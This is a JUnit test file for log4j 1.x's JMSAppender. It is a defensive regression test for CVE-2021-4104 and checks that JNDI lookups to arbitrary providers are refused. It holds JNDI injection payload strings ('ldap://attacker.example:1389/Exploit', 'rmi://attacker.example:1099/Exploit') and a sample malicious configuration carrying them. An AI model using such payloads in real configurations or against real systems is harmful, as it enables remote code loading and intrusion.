/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.log4j.net;

import junit.framework.TestCase;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;
import java.util.Properties;

import javax.jms.Topic;
import javax.jms.TopicConnectionFactory;
import javax.naming.Context;
import javax.naming.NameNotFoundException;
import javax.naming.NamingException;
import javax.naming.spi.InitialContextFactory;
import javax.naming.spi.InitialContextFactoryBuilder;
import javax.naming.spi.NamingManager;

import org.apache.log4j.Appender;
import org.apache.log4j.Level;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import org.apache.log4j.spi.ErrorHandler;
import org.apache.log4j.spi.LoggingEvent;

/**
 * Exploit tests for CVE-2021-4104: a log4j configuration must not be
 * able to make {@link JMSAppender} issue JNDI requests to a naming
 * service of the attacker's choosing.
 *
 * <p>A recording naming service is installed as the JVM wide initial
 * context factory, so every JNDI request JMSAppender would send, to any
 * provider, is captured instead of leaving the JVM.
 */
public class JMSAppenderTest extends TestCase {

  private static final String TCF_NAME = "java:comp/env/jms/TopicConnectionFactory";
  private static final String TOPIC_NAME = "java:comp/env/jms/Topic";

  /** Names the naming service was asked to resolve. */
  private static final List lookups = new ArrayList();
  /** Environments of the initial contexts that were created. */
  private static final List environments = new ArrayList();
  /** Messages published to the topic. */
  private static final List published = new ArrayList();
  private static boolean builderInstalled = false;

  private RecordingErrorHandler errorHandler;

  public JMSAppenderTest(String name) {
    super(name);
  }

  protected void setUp() throws Exception {
    synchronized (JMSAppenderTest.class) {
      if (!builderInstalled) {
        NamingManager.setInitialContextFactoryBuilder(new RecordingContextFactoryBuilder());
        builderInstalled = true;
      }
    }
    lookups.clear();
    environments.clear();
    published.clear();
    errorHandler = new RecordingErrorHandler();
  }

  protected void tearDown() {
    LogManager.resetConfiguration();
  }

  /**
   * TopicConnectionFactoryBindingName=ldap://... must not trigger an
   * LDAP lookup.
   */
  public void testLdapTopicConnectionFactoryBindingNameIsNotLookedUp() {
    String payload = "ldap://attacker.example:1389/Exploit";
    JMSAppender appender = createAppender(payload, TOPIC_NAME);

    appender.activateOptions();

    assertEquals("no JNDI request may be issued", 0, lookups.size());
    assertNull(appender.getTopicConnection());
    assertRefused(JNDIUtil.RESTRICTION_MSG + payload);
  }

  /**
   * TopicBindingName=rmi://... must not trigger an RMI lookup, even after
   * a legitimate connection factory was resolved.
   */
  public void testRmiTopicBindingNameIsNotLookedUp() {
    String payload = "rmi://attacker.example:1099/Exploit";
    JMSAppender appender = createAppender(TCF_NAME, payload);

    appender.activateOptions();

    assertEquals(1, lookups.size());
    assertEquals(TCF_NAME, lookups.get(0));
    assertNull(appender.getTopicPublisher());
    assertRefused(JNDIUtil.RESTRICTION_MSG + payload);
  }

  /**
   * The attack as delivered: a log4j configuration file carrying JNDI
   * payloads in both binding names.
   */
  public void testConfigurationWithJndiPayloadsIssuesNoLookup() {
    Properties props = new Properties();
    props.put("log4j.rootLogger", "INFO, jms");
    props.put("log4j.appender.jms", JMSAppender.class.getName());
    props.put("log4j.appender.jms.TopicConnectionFactoryBindingName",
        "ldap://attacker.example:1389/Exploit");
    props.put("log4j.appender.jms.TopicBindingName", "rmi://attacker.example:1099/Exploit");

    PropertyConfigurator.configure(props);
    Logger.getLogger(JMSAppenderTest.class).info("hello");

    assertEquals("no JNDI request may be issued", 0, lookups.size());
    assertEquals(0, published.size());
  }

  /**
   * java: binding names keep working and events are published.
   */
  public void testJavaNamespaceBindingNamesAreLookedUp() {
    JMSAppender appender = createAppender(TCF_NAME, TOPIC_NAME);

    appender.activateOptions();

    assertEquals(0, errorHandler.messages.size());
    assertEquals(2, lookups.size());
    assertEquals(TCF_NAME, lookups.get(0));
    assertEquals(TOPIC_NAME, lookups.get(1));
    assertNotNull(appender.getTopicPublisher());

    Logger logger = Logger.getLogger(JMSAppenderTest.class);
    appender.append(new LoggingEvent(Logger.class.getName(), logger, Level.INFO, "hello", null));
    assertEquals(1, published.size());
    appender.close();
  }

  /**
   * A configured initial context factory and provider URL are still
   * honoured for java: binding names.
   */
  public void testCustomInitialContextFactoryIsHonoured() {
    String factory = "org.example.jndi.LocalContextFactory";
    JMSAppender appender = createAppender(TCF_NAME, TOPIC_NAME);
    appender.setInitialContextFactoryName(factory);
    appender.setProviderURL("vm://localhost");

    appender.activateOptions();

    assertEquals(0, errorHandler.messages.size());
    assertEquals(1, environments.size());
    Hashtable env = (Hashtable) environments.get(0);
    assertEquals(factory, env.get(Context.INITIAL_CONTEXT_FACTORY));
    assertEquals("vm://localhost", env.get(Context.PROVIDER_URL));
    assertEquals(2, lookups.size());
    assertNotNull(appender.getTopicPublisher());
    appender.close();
  }

  private JMSAppender createAppender(String tcfBindingName, String topicBindingName) {
    JMSAppender appender = new JMSAppender();
    appender.setName("jms");
    appender.setErrorHandler(errorHandler);
    appender.setTopicConnectionFactoryBindingName(tcfBindingName);
    appender.setTopicBindingName(topicBindingName);
    return appender;
  }

  private void assertRefused(String expectedMessage) {
    assertEquals(1, errorHandler.exceptions.size());
    Exception e = (Exception) errorHandler.exceptions.get(0);
    assertTrue("unexpected " + e, e instanceof NamingException);
    assertEquals(expectedMessage, e.getMessage());
  }

  /**
   * Hands out the recording naming service whatever the configured
   * initial context factory or provider URL.
   */
  public static final class RecordingContextFactoryBuilder
      implements InitialContextFactoryBuilder {
    public InitialContextFactory createInitialContextFactory(Hashtable environment) {
      return new InitialContextFactory() {
        public Context getInitialContext(Hashtable env) {
          environments.add(env == null ? new Hashtable() : new Hashtable(env));
          return recordingContext();
        }
      };
    }
  }

  private static Context recordingContext() {
    return (Context) Proxy.newProxyInstance(
        JMSAppenderTest.class.getClassLoader(),
        new Class[] { Context.class },
        new InvocationHandler() {
          public Object invoke(Object proxy, Method method, Object[] args)
              throws NamingException {
            String methodName = method.getName();
            if ("lookup".equals(methodName)) {
              String name = String.valueOf(args[0]);
              lookups.add(name);
              if (TCF_NAME.equals(name)) {
                return jmsStub(TopicConnectionFactory.class);
              }
              if (TOPIC_NAME.equals(name)) {
                return jmsStub(Topic.class);
              }
              throw new NameNotFoundException(name);
            }
            if ("getEnvironment".equals(methodName)) {
              return new Hashtable();
            }
            return objectMethod(proxy, method, args, "RecordingContext");
          }
        });
  }

  /**
   * Returns a stub of a javax.jms interface whose factory methods return
   * further stubs and which records published messages.
   */
  private static Object jmsStub(final Class type) {
    return Proxy.newProxyInstance(
        JMSAppenderTest.class.getClassLoader(),
        new Class[] { type },
        new InvocationHandler() {
          public Object invoke(Object proxy, Method method, Object[] args) {
            if (method.getDeclaringClass() == Object.class) {
              return objectMethod(proxy, method, args, type.getName());
            }
            if ("publish".equals(method.getName())) {
              published.add(args[0]);
              return null;
            }
            Class returnType = method.getReturnType();
            if (returnType.isInterface() && returnType.getName().startsWith("javax.jms.")) {
              return jmsStub(returnType);
            }
            if (returnType == Boolean.TYPE) {
              return Boolean.FALSE;
            }
            if (returnType == Integer.TYPE) {
              return new Integer(0);
            }
            if (returnType == Long.TYPE) {
              return new Long(0);
            }
            return null;
          }
        });
  }

  private static Object objectMethod(Object proxy, Method method, Object[] args, String label) {
    String methodName = method.getName();
    if ("hashCode".equals(methodName)) {
      return new Integer(System.identityHashCode(proxy));
    }
    if ("equals".equals(methodName)) {
      return (proxy == args[0]) ? Boolean.TRUE : Boolean.FALSE;
    }
    if ("toString".equals(methodName)) {
      return label;
    }
    return null;
  }

  private static final class RecordingErrorHandler implements ErrorHandler {
    final List messages = new ArrayList();
    final List exceptions = new ArrayList();

    public void setLogger(Logger logger) {
    }

    public void error(String message, Exception e, int errorCode) {
      messages.add(message);
      if (e != null) {
        exceptions.add(e);
      }
    }

    public void error(String message) {
      messages.add(message);
    }

    public void error(String message, Exception e, int errorCode, LoggingEvent event) {
      error(message, e, errorCode);
    }

    public void setAppender(Appender appender) {
    }

    public void setBackupAppender(Appender appender) {
    }

    public void activateOptions() {
    }
  }
}
